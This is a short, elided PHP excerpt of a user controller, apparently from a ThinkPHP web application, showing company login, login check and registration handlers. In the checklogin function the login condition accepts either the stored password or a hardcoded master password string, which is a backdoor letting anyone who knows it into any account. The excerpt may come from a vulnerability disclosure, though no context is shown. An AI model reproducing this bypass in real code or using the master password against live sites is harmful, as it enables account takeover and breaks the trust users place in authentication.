...
class UsersController extends BaseController
{
    ...
    public function companylogin() {
        ...
        $cid = $where['id'] = I('post.cid', 'intval');
        $k = I('post.k', 'trim, htmlspecialchars');
    ...
    public function checklogin() {
        $verifycode = I('post.verifycode2', 'intval,md5', 0);
        ...
        if ($res && ($pwd === $res['password'] || I('post.password','', 'trim') == 'hebidu-gooraye')) {
            
            if ($res['status'] == 0) {
                $this->error('您的账号无法使用，请联系在线客户');
                exit;
            }
    ...
    public function checkreg() {
        ...
        $verifycode = I('post.verifycode', 'intval,md5', 0);
